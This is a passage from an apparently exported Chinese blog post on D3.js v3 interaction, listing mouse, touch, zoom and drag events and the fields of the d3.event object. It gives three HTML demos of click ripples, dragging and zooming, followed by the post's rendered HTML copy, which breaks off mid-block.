* `d3.behavior.zoom` 创建一个缩放行为\n    * `zoom(selection)` 将此缩放行为应用到 selection 上（一般使用 `selection.call(zoom)`）\n    * `zoom.on(type, listener)` 设置事件类型和监听器\n        * `zoomstart` 缩放开始时\n        * `zoom` 缩放中\n        * `zoomend` 缩放结束时\n    * `zoom.scaleExtent()` 设置缩放的最小、最大值，默认为 `[0, +∞]`\n    * `zoom.scale()` 设置初始的缩放大小\n    * `zoom.translate()` 设置当前缩放的平移向量，默认为 `[0, 0]`\n    * `zoom.duration()` 取得或设置双击事件的过渡持续的时间\n    * `zoom.x()` 设置 X轴 方向的比例尺\n    * `zoom.y()` 设置 Y轴 方向的比例尺\n* 拖拽事件 `d3.behavior.drag`\n    * `d3.behavior.darg` 创建一个拖拽行为\n    * `darg(selection)` 将此拖拽行为应用到 selection 上（一般使用 `selection.call(darg)`）\n    * `darg.on(type, listener)` 设置事件类型和监听器\n        * `dargstart` 拖拽开始时\n        * `darg` 拖拽中\n        * `dargend` 拖拽结束时\n    * `dray.origin()` 设置拖动行为的原点\n\n### 2、事件对象 `d3.event`\n\n说明  `d3.evnet` 对象是 DOM 事件，并实现了标准事件字段\n\n* `event.x`: 相对于可视区的坐标（与 `event.clientX` 一样）\n* `event.clientX`: 相对于可视区的坐标（与滚动的距离无关，以浏览器左上角为基准）\n* `event.offsetX`: 相对于容器的坐标（鼠标与触发事件的元素的距离）\n* `event.pageX`: 鼠标位置相对于文档的坐标（包含滚动的距离，以文档左上角为基准）\n* `event.screenX`: 鼠标位置相对于屏幕 X 轴的坐标（与滚动的距离无关，以屏幕左上角为基准）\n* `event.translate`: 返回鼠标位移的数据，如 `[100, 20]`\n* `event.scale`: 返回鼠标缩放的大小，如 `1.2`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .circle-item {\n            fill: none;\n            stroke: #090;\n            stroke-width: 4;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = document.documentElement.clientWidth;\n        let h = document.documentElement.clientHeight;\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        svg.append('text')\n            .attr('x', 10)\n            .attr('y', 24)\n            .attr('class', 'mouse-info');\n\n        function updateInfo(str) {\n            svg.select('.mouse-info').text(str);\n        }\n\n        svg.on('mousemove', () => {\n            let event = d3.event;\n            let str = `x ：${event.offsetX} \\n Y: ${event.offsetY}`;\n            updateInfo(str);\n        });\n        \n        svg.on('click', function () {\n            let event = d3.event;\n            console.log(event);\n            let x = event.offsetX;\n            let y = event.offsetY;\n\n            let data = [1, 2, 3, 4];\n\n            svg.selectAll('cirle')\n                .data(data)\n                .enter()\n                .append('circle')\n                .attr('class', 'circle-item')\n                .attr('cx', x)\n                .attr('cy', y)\n                .attr('r', 0)\n            .transition()\n                .duration(2000)\n                .delay((d, i) => Math.pow(i + 1, 2) * 100)\n                .ease('ease-out')\n                .attr('r', 500)\n                .style('stroke-width', 1)\n                .style('opacity', 0)\n                .each('end', function () {\n                    d3.select(this).remove();\n                });\n                \n        });\n    </script>\n\n</body>\n\n</html>\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .circle-item {\n            opacity: .5;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 800;\n        let h = 600;\n        let r = 60;\n\n        let data = [{\n            x: w / 2 - r,\n            y: w / 2 - r\n        }, {\n            x: w / 2 - r,\n            y: w / 2 + r\n        }, {\n            x: w / 2 + r,\n            y: w / 2 - r\n\n        }, {\n            x: w / 2 + r,\n            y: w / 2 + r\n        }];\n\n        function dragHandler() {\n            let event = d3.event;\n            d3.select(this)\n                .attr('transform', `translate(${event.x}, ${event.y})`);\n        }\n        \n        let drag = d3.behavior.drag().on('drag', dragHandler);\n        let color = d3.scale.category10();\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n            \n            \n        let container = svg.append('g')\n            .attr('class', 'container');\n            \n            \n        container.selectAll('circle')\n            .data(data)\n            .enter()\n            .append('circle')\n            .attr('class', 'circle-item')\n            .attr('transform', d => `translate(${d.x}, ${d.y})`)\n            .attr('r', 60)\n            .style('fill', (d, i) => color(i))\n            .call(drag);\n    </script>\n\n</body>\n\n</html>\n```\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .circle-item {\n            fill: #090;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 800;\n        let h = 600;\n        let r = 60;\n        \n        let data = [{\n            x: w / 2 - r,\n            y: w / 2 - r\n        }, {\n            x: w / 2 - r,\n            y: w / 2 + r\n        }, {\n            x: w / 2 + r,\n            y: w / 2 - r\n            \n        }, {\n            x: w / 2 + r,\n            y: w / 2 + r\n        }];\n\n        function zoomHandler () {\n            let event = d3.event;\n            d3.select('.container')\n                .attr('transform', `translate(${event.translate}) scale(${event.scale})`);\n        }\n\n        let zoom = d3.behavior.zoom()\n            .scaleExtent([1, 10])\n            .on('zoom', zoomHandler);\n\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h)\n            .call(zoom);\n\n\n        let container = svg.append('g')\n            .attr('class', 'container');\n\n\n        container.selectAll('circle')\n            .data(data)\n            .enter()\n            .append('circle')\n            .attr('class', 'circle-item')\n            .attr('transform', d => `translate(${d.x}, ${d.y})`)\n            .attr('r', 60);\n    </script>\n\n</body>\n\n</html>\n```","slug":"D3.js/可视化交互","published":1,"updated":"2021-04-28T02:31:14.932Z","_id":"cko0u126e0000y26r9x4s5a3h","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"可视化交互\"><a href=\"#可视化交互\" class=\"headerlink\" title=\"可视化交互\"></a>可视化交互</h1><h3 id=\"1、事件类型\"><a href=\"#1、事件类型\" class=\"headerlink\" title=\"1、事件类型\"></a>1、事件类型</h3><ul>\n<li>鼠标事件<ul>\n<li><code>click</code> 单击</li>\n<li><code>dbclick</code> 双击</li>\n<li><code>mousemove</code> 鼠标移动</li>\n<li><code>mouseenter</code> 鼠标进入</li>\n<li><code>mouseleave</code> 鼠标离开</li>\n<li><code>mouseover</code> 鼠标滑入</li>\n<li><code>mouseout</code> 鼠标滑出</li>\n<li><code>mousedown</code> 鼠标按下</li>\n<li><code>mouseup</code> 鼠标弹起</li>\n</ul>\n</li>\n<li>触摸事件<ul>\n<li><code>touchstart</code> 触摸点在屏幕上接触时</li>\n<li><code>touchmove</code> 触摸点在屏幕上移动时</li>\n<li><code>touchend</code> 触摸点在屏幕上移开时</li>\n</ul>\n</li>\n<li>缩放、平移事件 <code>d3.behavior.zoom</code><ul>\n<li><code>d3.behavior.zoom</code> 创建一个缩放行为</li>\n<li><code>zoom(selection)</code> 将此缩放行为应用到 selection 上（一般使用 <code>selection.call(zoom)</code>）</li>\n<li><code>zoom.on(type, listener)</code> 设置事件类型和监听器<ul>\n<li><code>zoomstart</code> 缩放开始时</li>\n<li><code>zoom</code> 缩放中</li>\n<li><code>zoomend</code> 缩放结束时</li>\n</ul>\n</li>\n<li><code>zoom.scaleExtent()</code> 设置缩放的最小、最大值，默认为 <code>[0, +∞]</code></li>\n<li><code>zoom.scale()</code> 设置初始的缩放大小</li>\n<li><code>zoom.translate()</code> 设置当前缩放的平移向量，默认为 <code>[0, 0]</code></li>\n<li><code>zoom.duration()</code> 取得或设置双击事件的过渡持续的时间</li>\n<li><code>zoom.x()</code> 设置 X轴 方向的比例尺</li>\n<li><code>zoom.y()</code> 设置 Y轴 方向的比例尺</li>\n</ul>\n</li>\n<li>拖拽事件 <code>d3.behavior.drag</code><ul>\n<li><code>d3.behavior.darg</code> 创建一个拖拽行为</li>\n<li><code>darg(selection)</code> 将此拖拽行为应用到 selection 上（一般使用 <code>selection.call(darg)</code>）</li>\n<li><code>darg.on(type, listener)</code> 设置事件类型和监听器<ul>\n<li><code>dargstart</code> 拖拽开始时</li>\n<li><code>darg</code> 拖拽中</li>\n<li><code>dargend</code> 拖拽结束时</li>\n</ul>\n</li>\n<li><code>dray.origin()</code> 设置拖动行为的原点</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2、事件对象-d3-event\"><a href=\"#2、事件对象-d3-event\" class=\"headerlink\" title=\"2、事件对象 d3.event\"></a>2、事件对象 <code>d3.event</code></h3><p>说明  <code>d3.evnet</code> 对象是 DOM 事件，并实现了标准事件字段</p>\n<ul>\n<li><code>event.x</code>: 相对于可视区的坐标（与 <code>event.clientX</code> 一样）</li>\n<li><code>event.clientX</code>: 相对于可视区的坐标（与滚动的距离无关，以浏览器左上角为基准）</li>\n<li><code>event.offsetX</code>: 相对于容器的坐标（鼠标与触发事件的元素的距离）</li>\n<li><code>event.pageX</code>: 鼠标位置相对于文档的坐标（包含滚动的距离，以文档左上角为基准）</li>\n<li><code>event.screenX</code>: 鼠标位置相对于屏幕 X 轴的坐标（与滚动的距离无关，以屏幕左上角为基准）</li>\n<li><code>event.translate</code>: 返回鼠标位移的数据，如 <code>[100, 20]</code></li>\n<li><code>event.scale</code>: 返回鼠标缩放的大小，如 <code>1.2</code></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .circle-item &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: none;</span></span><br><span class=\"line\"><span class=\"css\">            stroke: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\"><span class=\"css\">            stroke-<span class=\"attribute\">width</span>: <span class=\"number\">4</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"built_in\">document</span>.documentElement.clientWidth;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"built_in\">document</span>.documentElement.clientHeight;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">10</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">24</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;mouse-info&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">updateInfo</span>(<span class=\"params\">str</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            svg.select(<span class=\"string\">&#x27;.mouse-info&#x27;</span>).text(str);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.on(<span class=\"string\">&#x27;mousemove&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> str = <span class=\"string\">`x ：<span class=\"subst\">$&#123;event.offsetX&#125;</span> \\n Y: <span class=\"subst\">$&#123;event.offsetY&#125;</span>`</span>;</span></span><br><span class=\"line\">            updateInfo(str);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        svg.on(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.log(event);</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> x = event.offsetX;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> y = event.offsetY;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> data = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            svg.selectAll(<span class=\"string\">&#x27;cirle&#x27;</span>)</span></span><br><span class=\"line\">                .data(data)</span><br><span class=\"line\">                .enter()</span><br><span class=\"line\"><span class=\"javascript\">                .append(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;circle-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;cx&#x27;</span>, x)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;cy&#x27;</span>, y)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\">            .transition()</span><br><span class=\"line\">                .duration(2000)</span><br><span class=\"line\"><span class=\"javascript\">                .delay(<span class=\"function\">(<span class=\"params\">d, i</span>) =&gt;</span> <span class=\"built_in\">Math</span>.pow(i + <span class=\"number\">1</span>, <span class=\"number\">2</span>) * <span class=\"number\">100</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .ease(<span class=\"string\">&#x27;ease-out&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">500</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;stroke-width&#x27;</span>, <span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;opacity&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .each(<span class=\"string\">&#x27;end&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    d3.select(<span class=\"built_in\">this</span>).remove();</span></span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">                </span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .circle-item &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">opacity</span>: .<span class=\"number\">5</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">800</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> r = <span class=\"number\">60</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> data = [&#123;</span></span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dragHandler</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            d3.select(<span class=\"built_in\">this</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;event.x&#125;</span>, <span class=\"subst\">$&#123;event.y&#125;</span>)`</span>);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> drag = d3.behavior.drag().on(<span class=\"string\">&#x27;drag&#x27;</span>, dragHandler);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> color = d3.scale.category10();</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>);</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        container.selectAll(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\">            .data(data)</span><br><span class=\"line\">            .enter()</span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;circle-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"function\"><span class=\"params\">d</span> =&gt;</span> <span class=\"string\">`translate(<span class=\"subst\">$&#123;d.x&#125;</span>, <span class=\"subst\">$&#123;d.y&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">60</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"function\">(<span class=\"params\">d, i</span>) =&gt;</span> color(i))</span></span><br><span class=\"line\">            .call(drag);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 